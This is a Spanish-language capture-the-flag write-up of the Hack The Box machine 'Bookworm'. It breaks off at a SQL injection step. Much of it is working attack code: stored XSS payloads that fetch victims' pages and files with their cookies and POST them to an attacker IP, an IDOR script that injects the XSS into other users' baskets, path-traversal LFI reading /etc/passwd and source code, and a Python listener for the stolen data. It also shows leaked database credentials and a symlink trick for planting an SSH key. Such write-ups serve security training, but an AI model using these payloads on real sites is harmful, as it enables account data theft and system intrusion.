---
tags:
title: Bookworm - Insane (HTB)
permalink: /Bookworm-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
 nmapf 10.129.229.208
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 12:47 -0500
Initiating Ping Scan at 12:47
Scanning 10.129.229.208 [4 ports]
Completed Ping Scan at 12:47, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:47
Completed Parallel DNS resolution of 1 host. at 12:47, 0.50s elapsed
Initiating SYN Stealth Scan at 12:47
Scanning 10.129.229.208 [65535 ports]
Discovered open port 22/tcp on 10.129.229.208
Discovered open port 80/tcp on 10.129.229.208
Completed SYN Stealth Scan at 12:48, 9.12s elapsed (65535 total ports)
Nmap scan report for 10.129.229.208
Host is up, received echo-reply ttl 63 (0.35s latency).
Scanned at 2026-02-16 12:47:54 EST for 9s
Not shown: 63835 closed tcp ports (reset), 1698 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds
           Raw packets sent: 84207 (3.705MB) | Rcvd: 71839 (2.874MB)
-e [*] IP: 10.129.229.208
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 12:48 -0500
Nmap scan report for 10.129.229.208
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 81:1d:22:35:dd:21:15:64:4a:1f:dc:5c:9c:66:e5:e2 (RSA)
|   256 01:f9:0d:3c:22:1d:94:83:06:a4:96:7a:01:1c:9e:a1 (ECDSA)
|_  256 64:7d:17:17:91:79:f6:d7:c4:87:74:f8:a2:16:f7:cf (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://bookworm.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.42 seconds
```

## Website

La pagina principal hostea una tienda de libros.

![image-center](/assets/images/Pasted image 20260216144845.png)
### Register account

Me registre, ya que para agregar libros al carrito necesito una cuenta.

![image-center](/assets/images/Pasted image 20260216145049.png)

Elegí uno al azar y le di a `Add to basket`.

![image-center](/assets/images/Pasted image 20260216144941.png)
### File Upload bypass

Viendo la solicitud de esta accion, veo que el `Content-Security-Policy (CSP)` esta habilitado en `self`, lo que no permite cargar recursos externos que no sean del propio lugar desde donde se realiza la solicitud.

![image-center](/assets/images/Pasted image 20260216145931.png)
## Shell as frank

Viendo en mi perfil, además vi que puedo cambiar mi `avatar`, en donde la aplicación valida que sea una imagen. En este caso primero cree un `txt` con el siguiente comando

```bash
echo "test" > test.txt
```

Luego de subirlo, claramente me salió un error, el cual bypassee, cambiando el `Content-Type` del archivo, al de una imagen.

![image-center](/assets/images/Pasted image 20260216150018.png)
### XSS 

Otra cosa a notar que me sirvió para mas adelante, es que la web es corrida con `ExpressJS`.

![image-center](/assets/images/Pasted image 20260216150105.png)

La imagen que subí se guarda en la ruta `/static/img/uploads/14`, que cuando voy a la misma, veo que me abre el propio archivo con el contenido que previamente cree.

![image-center](/assets/images/Pasted image 20260216150151.png)

Cambie el contenido del archivo a un simple payload `xss` el cual genera una ventana emergente con el numero `1`.

```
alert(1);
```
### Update notes

Una vez habiendo hecho esto, fui al carrito donde edite el contenido de la nota, tratando de cargar el propio recurso al que yo tengo acceso, en el cual esta mi código `javascript`.

![image-center](/assets/images/Pasted image 20260216150636.png)

De manera que cuando actualizo la nota, y le doy a `Complete Checkout`, me sale el mensaje.

![image-center](/assets/images/Pasted image 20260216150915.png)
### Exfiltrate data 

Puedo usar en el contenido del archivo código `Javascript` el cual me permita a mi, como atacante, hacer que la web cargue un recurso externo de mi maquina.
Para eso primero cree un servidor en Python y coloque el siguiente payload en el contenido del archivo desde el cual voy a inyectar código `JS`.

```javascript
fetch("http://bookworm.htb/profile", { mode: 'no-cors'})
.then((response) => response.text())
.then((text) => {
fetch("http://10.10.17.19:8000", { mode: 'no-cors', method: "POST", body:
text})
})
```

Después volví a actualizar la nota y complete la compra, viendo que recibo la solicitud, pero por `POST`.

```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[tun0] 10.10.17.19
[br-427beff723d7] 172.18.0.1
[/home/zsln/Desktop/zsln/Bookworm]
allPorts  port_scan  test.txt
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.17.19 - - [16/Feb/2026 13:22:47] code 501, message Unsupported method ('POST')
10.10.17.19 - - [16/Feb/2026 13:22:47] "POST / HTTP/1.1" 501 -
```
### Server Python

Para poder recibir el contenido y las solicitudes por `POST`, cree un script en Python con un servidor que sirve en el puerto `8000`.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(post_data.decode('utf-8'))
        self.send_response(200)
        self.end_headers()
def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler,port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

Y luego de volver a realizar todo el proceso, veo que en mi servidor, veo la respuesta con el codigo HTML de la web.

```bash
python3 server.py
Starting server on port 8000
<SNIP>
    <tr>
      <th scope="row">Order #129</th>
      <td>Mon Feb 16 2026 17:55:27 GMT+0000 (Coordinated Universal Time)</td>
      <td>£34</td>
      <td>
        <a href="/order/129">View Order</
      </td>
    </tr>

    <tr>
      <th scope="row">Order #132</th>
      <td>Mon Feb 16 2026 18:02:19 GMT+0000 (Coordinated Universal Time)</td>
      <td>£14</td>
      <td>
        <a href="/order/132">View Order</
      </td>
    </tr>

    <tr>
      <th scope="row">Order #135</th>
      <td>Mon Feb 16 2026 18:10:04 GMT+0000 (Coordinated Universal Time)</td>
      <td>£17</td>
<SNIP>

10.10.17.19 - - [16/Feb/2026 13:28:59] "POST / HTTP/1.1" 200 -
```

### Insecure Direct Object Reference (IDOR)

Una vez teniendo esto, vi que en el código fuente de `/shop`, cada usuario en la sección `Recent Updates`, realiza una compra y la misma se ve en dicho resumen, en dicho código veo que cada compra tiene un `id`.

![image-center](/assets/images/Pasted image 20260217140451.png)

Por lo que cree un script en cual pueda yo, desde mi maquina enumerar un `Basket ID`, de manera que luego trato de cargar el código `JavaScript` para que se cargue los recursos de esa pagina en mi servidor.

```python
import re
import requests
import time

# conf
#TARGET_URL = "http://bookworm.htb"
# cookie 
cookies = {
    "session": "eyJmbGFzaE1lc3NhZ2UiOnt9LCJ1c2VyIjp7ImlkIjoxNCwibmFtZSI6InRlc3QiLCJhdmF0YXIiOiIvc3RhdGljL2ltZy91c2VyLnBuZyJ9fQ==",
    "session.sig": "dtkE9ARewwwgc5DaYmid5ayxMnc"
}

headers = {
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# id 14 de la imagen/javascript subido
data = {
    "quantity": "1",
    "note": "<script src=\"/static/img/uploads/14\"></script>"
}

def get_id():
    r = requests.get(f'http://bookworm.htb/shop', headers=headers, cookies=cookies)
    find = r"<!-- (\d+) -->"
    match = re.search(find, r.text)
    return match.group(1) if match else None

prev_id = ""
print("Iniciando monitoreo de carritos...")

while True:
    try:
        current_id = get_id()
        if current_id and current_id != prev_id:
            print(f"[+] Nuevo carrito detectado: {current_id}")
            prev_id = current_id

            # inyecto xss en el carro
            edit_url = f"http://bookworm.htb:80/basket/{current_id}/edit"
            requests.post(edit_url, headers=headers, cookies=cookies, data=data)
            print(f"[!] Payload inyectado en: {edit_url}")

        time.sleep(1) 
    except KeyboardInterrupt:
        print("\nSaliendo...")
        break
    except Exception as e:
        continue
```

### Enumeration XSS and IDOR

Ejecuto el script y asi veo que detecta el id del carro.

```bash
python3 basket.py
Iniciando monitoreo de carritos...
[+] Nuevo carrito detectado: 368
[!] Payload inyectado en: http://bookworm.htb:80/basket/368/edit
```

Además veo que en mi servidor recibo las solicitudes.

```bash
python3 server.py
Starting server on port 8000
<SNIP>
    <tr>
      <th scope="row">Order #4</th>
      <td>Mon Dec 19 2022 20:10:04 GMT+0000 (Coordinated Universal Time)</td>
      <td>£28</td>
      <td>
        <a href="/order/4">View Order</
      </td>
    </tr>

    <tr>
      <th scope="row">Order #5</th>
      <td>Tue Dec 20 2022 20:10:04 GMT+0000 (Coordinated Universal Time)</td>
      <td>£25</td>
      <td>
        <a href="/order/5">View Order</
      </td>
    </tr>

    <tr>
      <th scope="row">Order #6</th>
      <td>Fri Dec 23 2022 20:10:04 GMT+0000 (Coordinated Universal Time)</td>
      <td>£17</td>
      <td>
        <a href="/order/6">View Order</
      </td>
    </tr>

    <tr>
      <th scope="row">Order #150</th>
      <td>Mon Feb 16 2026 18:55:46 GMT+0000 (Coordinated Universal Time)</td>
      <td>£72</td>
      <td>
        <a href="/order/150">View Order</
      </td>
    </tr>

  </tbody>
</table>
<SNIP>
```

Es de notar que en el código se ve la misma opción de `View Order` que de mi web.

![image-center](/assets/images/Pasted image 20260217141013.png)

En mi caso yo al ir a ese enlace que me redirige a `/order/<id>`, no veo mucho.

![image-center](/assets/images/Pasted image 20260217141053.png)

Por lo que cree una regex que de la respuesta de `/profile`, filtre por el endpoint `/order/<id>`, para luego exfiltrar el código HTML que tienen estos usuarios al ingresa a x orden.

{% raw %}
```javascript
fetch('/profile', {credentials: "include"})
.then((resp) => resp.text())
.then((resptext) => {
  var regex = /\/order\/\d+/g;
  while ((match = regex.exec(resptext)) !== null) {
    fetch(match, {credentials: "include"})
    .then((resp2) => resp2.text())
    .then((resptext2) => {
      fetch("http://10.10.17.19:8000/" + match, {
        method: "POST",
        mode: "no-cors",
        body: resptext2
      });
    });
  };
});
```
{% endraw %}
### LFI

Volví a ejecutar el script nuevamente, y veo que los usuarios tienen un enlace el cual les permite descargar el libro de la compra.

```bash
<SNIP>
    <tr>
      <th scope="row">Der Spiegel: Anekdoten zeitgenössischer deutscher Erzähler</th>
      <td>2</td>
      <td>£62</td>
      <td>

      </td>

      <td>
        <a href="/download/2?bookIds=3" download="Der Spiegel: Anekdoten zeitgenössischer deutscher Erzähler.pdf">Download e-book</a>
        </td>

    </tr>

  </tbody>
</table>


  <a href="/download/2?bookIds=18&amp;bookIds=11" download>Download everything</a>


<a href="/profile">View Your Other Orders</a>

<SNIP>
```

Use el primer endpoint para descargar un libro solo, y enviar la respuesta a mi servidor.

```javascript
for (let i = 1; i <= 30; i++) {
    // 1. Intentamos descargar la orden 'i' con el libro 13 usando las cookies de la víctima
    fetch("http://bookworm.htb/download/" + i + "?bookIds=13", { 
        mode: 'no-cors', 
        credentials: 'include' 
    })
    .then((response) => response.text())
    .then((text) => {
        // 2. Enviamos el contenido a tu servidor. 
        // Agregamos /ORDEN_i para que identifiques los resultados en tu log.
        fetch("http://10.10.17.19:8000/ORDEN_" + i, { 
            mode: 'no-cors', 
            method: "POST", 
            body: text 
        });
    })
    .catch((error) => {
        // Silenciamos errores de red para que el bucle no se detenga
    });
}
```

Viendo que desde la respuesta del mismo, recibo el contenido de un archivo `PDF`.

```bash
<SNIP>
/Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Producer (PyFPDF 1.7.2 http://pyfpdf.googlecode.com/)
/CreationDate (D:20230129212444)
>>
endobj
7 0 obj
<<
/Type /Catalog
/Pages 1 0 R
/OpenAction [3 0 R /FitH null]
/PageLayout /OneColumn
>>
endobj
xref
0 8
0000000000 65535 f
0000000251 00000 n
0000000434 00000 n
0000000009 00000 n
0000000087 00000 n
0000000338 00000 n
0000000538 00000 n
0000000647 00000 n
trailer
<<
/Size 8
/Root 7 0 R
/Info 6 0 R
>>
startxref
750
%%EOF
<SNIP>
```
### Download everything

Como veo que puedo obtener el contenido de los libros, quiero leer archivos del sistema, así que use el link de `Download Everything` para poder crear un payload LFI para poder leer el `/etc/passwd` por ejemplo.

```js
fetch('/profile', {credentials: 'include'})
.then((resp) => resp.text())
.then((resptext) => {
  order_id = resptext.match(/\/order\/(\d+)/);
fetch("http://bookworm.htb/download/"+order_id[1]+"?bookIds=1&bookIds=../../../../../etc/passwd", {credentials: 'include'})
  .then((resp2) => resp2.blob())
  .then((data) => {
    fetch("http://10.10.17.19:8000/upload", { 
      method: "POST",
      mode: 'no-cors',
      body: data
    });
  });
});
```

### Parsing ZIP file

Para poder recolectar todos los archivos cree un webserver con Python, para poder colocar el contenido que reciba dentro de un `zip` y en la carpeta `exfil` (Luego me di cuenta el con la opción `Download Everything` los archivos se comprimían con `zip`).

```bash
from pathlib import Path
from flask import Flask, request
from datetime import datetime
import zipfile
import io

app = Flask(__name__)

# Crear directorio si no existe
Path('exfil').mkdir(exist_ok=True)

@app.route('/upload', methods=["POST"])
def upload():
    data = request.get_data()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    client_ip = request.remote_addr

    print(f"\n[+] Recibido desde {client_ip} - {len(data)} bytes")

    # Guardar el ZIP
    zip_path = Path(f'exfil/{timestamp}.zip')
    zip_path.write_bytes(data)
    print(f"[+] Guardado en: {zip_path}")

    # Extraer y mostrar contenido automáticamente
    try:
        with zipfile.ZipFile(io.BytesIO(data), 'r') as z:
            print(f"[+] Archivos en ZIP: {z.namelist()}\n")

            for filename in z.namelist():
                content = z.read(filename).decode('utf-8', errors='ignore')
                print(f"{'='*60}")
                print(f"ARCHIVO: {filename}")
                print(f"{'='*60}")
                print(content)
                print(f"{'='*60}\n")

                # Guardar también extraído
                safe_name = filename.replace('/', '_').replace('..', '')
                Path(f'exfil/{timestamp}_{safe_name}').write_text(content)

    except Exception as e:
        print(f"[!] Error extrayendo: {e}")

    return ""

if __name__ == "__main__":
    print("[+] Servidor de exfiltración en puerto 8000")
    print("[+] Endpoint: /upload")
    app.run(debug=True, host="0.0.0.0", port=8000)
```

Luego de esperar unos minutos, ya que el `bot` por detrás tarda alrededor de 4 minutos, veo el contenido del archivo al que apunte.

```bash
<SNIP>
============================================================
ARCHIVO: Unknown.pdf
============================================================
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
frank:x:1001:1001:,,,:/home/frank:/bin/bash
neil:x:1002:1002:,,,:/home/neil:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
james:x:1000:1000:,,,:/home/james:/bin/bash

============================================================

10.129.229.208 - - [16/Feb/2026 15:17:04] "POST /upload HTTP/1.1" 200 -
 * Restarting with watchdog (inotify)
[+] Servidor de exfiltración en puerto 8000
[+] Endpoint: /upload
 * Debugger is active!
 * Debugger PIN: 398-330-927
```
### LFI Script

Para hacerlo mas a meno, cree otro script adicional (opcional) por comodidad para actualizar mi payload JavaScript, para poder apuntar a un archivo que yo quiera.

```python
cat lfi.py
import requests
import sys

# --- CONFIGURACIÓN ---
TARGET_URL = "http://bookworm.htb/profile/avatar"
# Reemplaza con tus cookies actuales
COOKIES = {
    "session": "eyJmbGFzaE1lc3NhZ2UiOnt9LCJ1c2VyIjp7ImlkIjoxNCwibmFtZSI6InRlc3QiLCJhdmF0YXIiOiIvc3RhdGljL2ltZy91c2VyLnBuZyJ9fQ==",
    "session.sig": "dtkE9ARewwwgc5DaYmid5ayxMnc"
}

def exploit(file_to_read):
    # El Payload JS dinámico con el archivo que elijas
    # Se usan dobles llaves {{ }} para que Python no las confunda con variables del f-string
    js_payload = f"""
fetch('/profile', {{credentials: 'include'}})
.then((resp) => resp.text())
.then((resptext) => {{
  var order_id = resptext.match(/\\/order\\/(\\d+)/);
fetch("http://bookworm.htb/download/"+order_id[1]+"?bookIds=1&bookIds={file_to_read}", {{credentials: 'include'}})
  .then((resp2) => resp2.blob())
  .then((data) => {{
    fetch("http://10.10.17.19:8000/upload", {{
      method: "POST",
      mode: 'no-cors',
      body: data
    }});
  }});
}});
"""

    # Definimos el archivo para el multipart/form-data
    files = {
        'avatar': ('test.txt', js_payload, 'image/png')
    }

    print(f"[*] Subiendo payload para leer: {file_to_read}")

    try:
        response = requests.post(
            TARGET_URL,
            cookies=COOKIES,
            files=files,
            timeout=10
        )

        if response.status_code == 200:
            print("[+] Payload subido exitosamente.")
            print("[!] Ahora debes esperar a que el bot/admin vea tu perfil.")
        else:
            print(f"[-] Error en la subida. Código de estado: {response.status_code}")

    except Exception as e:
        print(f"[-] Ocurrió un error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 upload_exploit.py /ruta/del/archivo")
        print("Ejemplo: python3 upload_exploit.py /etc/passwd")
        sys.exit(1)

    archivo_objetivo = sys.argv[1]
    exploit(archivo_objetivo)
```
### Express JS file

Volviendo a `ExpressJS`, busque en internet archivos comunes para este framework, dentro de los cuales están `app.js, index,js, package.json`.

Empeze apuntando a `index.js`.

```bash
python3 lfi.py '../../../../../../../proc/self/cwd/index.js'
[*] Subiendo payload para leer: ../../../../../../../proc/self/cwd/index.js
[+] Payload subido exitosamente.
[!] Ahora debes esperar a que el bot/admin vea tu perfil.
```

Donde vi que en el contenido del mismo, se carga un archivo de base de datos `(database.js)`.

```js
const express = require("express");
const nunjucks = require("nunjucks");
const path = require("path");
const session = require("cookie-session");
const fileUpload = require("express-fileupload");
const archiver = require("archiver");
const fs = require("fs");
const { flash } = require("express-flash-message");
const { sequelize, User, Book, BasketEntry, Order, OrderLine } = require("./database");
const { hashPassword, verifyPassword } = require("./utils");
const { QueryTypes } = require("sequelize");
const { randomBytes } = require("node:crypto");
```
### Shell

Viendo el contenido del mismo, veo unas credenciales de conexion para la base de datos.

```bash
============================================================
ARCHIVO: Unknown.pdf
============================================================
const { Sequelize, Model, DataTypes } = require("sequelize");

//const sequelize = new Sequelize("sqlite::memory::");
const sequelize = new Sequelize(
  process.env.NODE_ENV === "production"
    ? {
        dialect: "mariadb",
        dialectOptions: {
          host: "127.0.0.1",
          user: "bookworm",
          database: "bookworm",
          password: "FrankTh3JobGiver",
        },
	  logging: false,
      }
    : "sqlite::memory::"
);
[..SNIP..]
```

Donde use la misma password para el usuario `frank` ya que era valida para el.

```bash
ssh frank@bookworm.htb

<SNIP>

Last login: Tue Dec  5 20:13:49 2023 from 10.10.14.46
frank@bookworm:~$ cat user.txt
81740a9a93149c0e56df11a5f3d863a2
```
## Shell as neil
### Internal service discovery

Viendo los puertos abiertos a nivel local, veo que el puerto `3000, 3001` estan.

```bash
frank@bookworm:~$ ss -tulpn
Netid            State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            Process
udp              UNCONN            0                 0                            127.0.0.53%lo:53                               0.0.0.0:*
udp              UNCONN            0                 0                                  0.0.0.0:68                               0.0.0.0:*
tcp              LISTEN            0                 80                               127.0.0.1:3306                             0.0.0.0:*
tcp              LISTEN            0                 511                                0.0.0.0:80                               0.0.0.0:*
tcp              LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*
tcp              LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*
tcp              LISTEN            0                 511                              127.0.0.1:3000                             0.0.0.0:*
tcp              LISTEN            0                 511                              127.0.0.1:3001                             0.0.0.0:*
tcp              LISTEN            0                 128                                   [::]:22                                  [::]:*
```
### Local port forwarding

Por lo los traje a mi maquina usando el propio `ssh`.

```bash
ssh frank@bookworm.htb -L 3001:127.0.0.1:3001 -L 3000:127.0.0.1:3000
```
### Calibre conversion abuse

En dicha web corre un convertidor de archivos.

![image-center](/assets/images/Pasted image 20260217032155.png)
### Source code

Dicho convertor, se encuentra en el directorio de `neil`. En el mismo veo que se usa `Calibre` para realizar la conversión de los archivos que se le pasen. Además el código fuente del mismo y como los convierte.

```javascript
frank@bookworm:/home/neil/converter$ ls -la
total 104
drwxr-xr-x  7 root root  4096 May  3  2023 .
drwxr-xr-x  6 neil neil  4096 May  3  2023 ..
drwxr-xr-x  8 root root  4096 May  3  2023 calibre
-rwxr-xr-x  1 root root  1658 Feb  1  2023 index.js
drwxr-xr-x 96 root root  4096 May  3  2023 node_modules
drwxrwxr-x  2 root neil  4096 Feb 17 06:30 output
-rwxr-xr-x  1 root root   438 Jan 30  2023 package.json
-rwxr-xr-x  1 root root 68895 Jan 30  2023 package-lock.json
drwxrwxr-x  2 root neil  4096 Feb 17 06:30 processing
drwxr-xr-x  2 root root  4096 May  3  2023 templates
frank@bookworm:/home/neil/converter$ cat index.js
const express = require("express");
const nunjucks = require("nunjucks");
const fileUpload = require("express-fileupload");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const child = require("child_process");

const app = express();
const port = 3001;

nunjucks.configure("templates", {
  autoescape: true,
  express: app,
});

app.use(express.urlencoded({ extended: false }));
app.use(
  fileUpload({
    limits: { fileSize: 2 * 1024 * 1024 },
  })
);

const convertEbook = path.join(__dirname, "calibre", "ebook-convert");

app.get("/", (req, res) => {
  const { error } = req.query;

  res.render("index.njk", { error: error === "no-file" ? "Please specify a file to convert." : "" });
});

app.post("/convert", async (req, res) => {
  const { outputType } = req.body;

  if (!req.files || !req.files.convertFile) {
    return res.redirect("/?error=no-file");
  }

  const { convertFile } = req.files;

  const fileId = uuidv4();
  const fileName = `${fileId}${path.extname(convertFile.name)}`;
  const filePath = path.resolve(path.join(__dirname, "processing", fileName));
  await convertFile.mv(filePath);

  const destinationName = `${fileId}.${outputType}`;
  const destinationPath = path.resolve(path.join(__dirname, "output", destinationName));

  console.log(filePath, destinationPath);

  const converter = child.spawn(convertEbook, [filePath, destinationPath], {
    timeout: 10_000,
  });

  converter.on("close", (code) => {
    res.sendFile(path.resolve(destinationPath));
  });
});

app.listen(port, "127.0.0.1", () => {
  console.log(`Development converter listening on port ${port}`);
});
```

### child.spawn 

El código hace esto:

```javascript
const destinationName = `${fileId}.${outputType}`;
const destinationPath = path.resolve(path.join(__dirname, "output", destinationName));
child.spawn(convertEbook, [filePath, destinationPath], ...);
```

Significa que yo controlo el `outputType`, por ende controlo el segundo argumento que recibe `eboook-converter`, además el archivo que tengo q ingresar puede ser de cualquier extensión, haciendo que cuando lo convierta a formato `epub` Calibre lo trata como una carpeta y escribe un **"Open E-book" (OEB)** lleno de archivos HTML.
### Path Traversal

Mi plan fue escribir una clave `id_ed25519` publica en el directorio `/home/neil/.ssh/authorized_keys`, para luego conectarme por `ssh` usando la privada de la misma.

Para eso cree un archivo `txt` con el contenido de mi clave publica.

```bash
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFrl3lUceDWKm4BMhFXeAxeKRT8CaeTV6U+HtGpwSJfI root@kali
```

Y luego lo subí.

![image-center](/assets/images/Pasted image 20260217150506.png)

Intercepte la petición con `Burpsuite`, para cambiar la ruta donde quiero escribirlo, pero no me deja.

![image-center](/assets/images/Pasted image 20260217150624.png)

Pero si lo hago en otro directorio si.

![image-center](/assets/images/Pasted image 20260217150745.png)

### Simlink abuse 

Viendo el archivo, el propietario es `neil`.

```bash
frank@bookworm:/tmp$ cat test.txt
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFrl3lUceDWKm4BMhFXeAxeKRT8CaeTV6U+HtGpwSJfI root@kali
frank@bookworm:/tmp$ ls -la
total 68
drwxrwxrwt 16 root  root  4096 Feb 17 18:11 .
drwxr-xr-x 20 root  root  4096 May  3  2023 ..
<SNIP>
-rw-r--r--  1 neil  neil    96 Feb 17 18:10 test.txt
<SNIP>
```

Como no puedo escribir en el archivo que quiero, pensé en crear un `Link simbolico (Symlink)`  que apunte a la ruta donde yo quiero colocar y escribir dicho archivo.

Para eso cree una carpeta en el directorio de `frank` y le di permisos, para luego crear el link.

```bash
frank@bookworm:~$ mkdir shell
frank@bookworm:~$ chmod 777 shell/
frank@bookworm:~$ ln -s /home/neil/.ssh/authorized_keys /home/frank/shell/pwn.txt
```

Luego escribí en el archivo del directorio de `frank` y como no recibí errores tuve éxito.

![image-center](/assets/images/Pasted image 20260217151206.png)
### Shell

Como ahora el archivo esta escrito, me conecte como el usuario `neil` usando mi clave privada.

```bash
ssh -i /root/.ssh/id_ed25519 neil@bookworm.htb
<SNIP>
neil@bookworm:~$
```
## Shell as root
### Sudo privileges

Vi los privilegios sudo de este usuario, y descubrí que el mismo podía ejecutar `genlabel`, como `root`.

```bash
neil@bookworm:~/.config/calibre$ sudo -l
Matching Defaults entries for neil on bookworm:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User neil may run the following commands on bookworm:
    (ALL) NOPASSWD: /usr/local/bin/genlabel
```
### Source code

Vi el contenido del script.

```python
neil@bookworm:~/.config/calibre$ cat /usr/local/bin/genlabel
#!/usr/bin/env python3

import mysql.connector
import sys
import tempfile
import os
import subprocess

with open("/usr/local/labelgeneration/dbcreds.txt", "r") as cred_file:
    db_password = cred_file.read().strip()

cnx = mysql.connector.connect(user='bookworm', password=db_password,
                              host='127.0.0.1',
                              database='bookworm')

if len(sys.argv) != 2:
    print("Usage: genlabel [orderId]")
    exit()

try:
    cursor = cnx.cursor()
    query = "SELECT name, addressLine1, addressLine2, town, postcode, Orders.id as orderId, Users.id as userId FROM Orders LEFT JOIN Users On Orders.userId = Users.id WHERE Orders.id = %s" % sys.argv[1]

    cursor.execute(query)

    temp_dir = tempfile.mkdtemp("printgen")
    postscript_output = os.path.join(temp_dir, "output.ps")
    # Temporary until our virtual printer gets fixed
    pdf_output = os.path.join(temp_dir, "output.pdf")

    with open("/usr/local/labelgeneration/template.ps", "r") as postscript_file:
        file_content = postscript_file.read()

    generated_ps = ""

    print("Fetching order...")
    for (name, address_line_1, address_line_2, town, postcode, order_id, user_id) in cursor:
        file_content = file_content.replace("NAME", name) \
                        .replace("ADDRESSLINE1", address_line_1) \
                        .replace("ADDRESSLINE2", address_line_2) \
                        .replace("TOWN", town) \
                        .replace("POSTCODE", postcode) \
                        .replace("ORDER_ID", str(order_id)) \
                        .replace("USER_ID", str(user_id))

    print("Generating PostScript file...")
    with open(postscript_output, "w") as postscript_file:
        postscript_file.write(file_content)

    print("Generating PDF (until the printer gets fixed...)")
    output = subprocess.check_output(["ps2pdf", "-dNOSAFER", "-sPAPERSIZE=a4", postscript_output, pdf_output])
    if output != b"":
        print("Failed to convert to PDF")
        print(output.decode())

    print("Documents available in", temp_dir)
    os.chmod(postscript_output, 0o644)
    os.chmod(pdf_output, 0o644)
    os.chmod(temp_dir, 0o755)
    # Currently waiting for third party to enable HTTP requests for our on-prem printer
    # response = requests.post("http://printer.bookworm-internal.htb", files={"file": open(postscript_output)})

except Exception as e:
    print("Something went wrong!")
    print(e)

cnx.close()
```
### SQL Injection

El script `genlabel` toma un argumento del usuario (`orderId`) y lo inserta directamente en una consulta SQL usando formateo de strings de Python (`%`):

```python
